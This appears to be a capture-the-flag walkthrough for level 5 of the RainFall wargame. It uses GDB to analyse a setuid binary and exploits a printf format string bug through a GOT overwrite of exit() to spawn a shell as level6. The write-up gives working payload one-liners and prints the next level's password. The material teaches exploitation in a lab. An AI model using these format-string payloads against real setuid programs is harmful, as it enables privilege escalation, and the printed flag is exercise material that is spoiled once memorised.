# Level5

## Walkthrough

We list the files in the current home directory.

```bash
level5@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
-rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
-rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile
level5@RainFall:~$ file level5 
level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xed1835fb7b09db7da4238a6fa717ad9fd835ae92, not stripped
```

The file is owned by **level6** and has the **setuid** bit.

We list the functions inside the executable and analyze their assembly code with **GDB**.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

There are 3 interesting functions: `main()`, `o()` and `n()`.

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   ebp
   0x08048505 <+1>:     mov    ebp,esp
   0x08048507 <+3>:     and    esp,0xfffffff0
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.
```

The `main()` function only calls the `n()` function.

```
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:     mov    eax,ds:0x8049848
   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:    lea    eax,[ebp-0x208]
   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    eax,[ebp-0x208]
   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```

The `n()` function:
- calls `fgets()` to read user input from stdin
- pass the user input to `printf()`
- calls `exit()`

```
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```

The `o()` function only calls `system("/bin/sh")`.

From our experience with the previous levels, we figure out that we will have to complete this one with a **format string attack**, thanks to `printf()`, in order to call `o()`.  
The logic is similar to the **level3** and **level4**, do not hesitate to read their `README` if needed.

Our first attempt to get the password is to overwrite the `old eip` stored before calling `printf()` with the address of `o()`.

```
(gdb) b printf
Breakpoint 1 at 0x8048380
(gdb) r
Starting program: /home/user/level5/level5 
AAAA

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers
eax            0xbffff430	-1073744848
ecx            0xb7fda005	-1208115195
edx            0xb7fd28c4	-1208145724
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff41c	0xbffff41c
ebp            0xbffff638	0xbffff638
esi            0x0	0
edi            0x0	0
eip            0xb7e78850	0xb7e78850 <printf>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/16wx 0xbffff41c
0xbffff41c:	0x080484f8	0xbffff430	0x00000200	0xb7fd1ac0
0xbffff42c:	0xb7ff37d0	0x41414141	0xb7e2000a	0x00000001
0xbffff43c:	0xb7fef305	0xbffff498	0xb7fde2d4	0xb7fde334
0xbffff44c:	0x00000007	0x00000000	0xb7fde000	0xb7fff53c
```

The first hexadecimal address `0x080484f8`, at the top of the stack, represents the address of the next `n()` instruction. It is stored at `0xbffff41c`, and the `o()` address is `0x080484a4`.  

```bash
level5@RainFall:~$ (python -c "print('\x1c\xf4\xff\xbf' + '%8x%8x%134513808x' + '%n')"; cat) | ./level5
```

Unfortunately the spawned shell is instantly closing. After discussing with other students, the `exit()` calls may be the reason of our problem. To bypass this issue, we can perform a **GOT overwrite**.

> Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn’t have to ask libc each time an external function is called.

We have to find the address of `exit()` in the GOT.

```
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
```

```
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:     push   0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

The `objdump` command can also be used in order to list all the GOT entries.

```bash
level5@RainFall:~$ objdump --dynamic-reloc ./level5

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

Our new target is the address `0x08049838`. We rewrite our command with the updated value.

```bash
level5@RainFall:~$ (python -c "print('\x38\x98\x04\x08' + '%8x%8x%134513808x' + '%n')"; cat) | ./level5
# [...]
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Resources

- [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
- [GOT and PLT for pwning.](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)
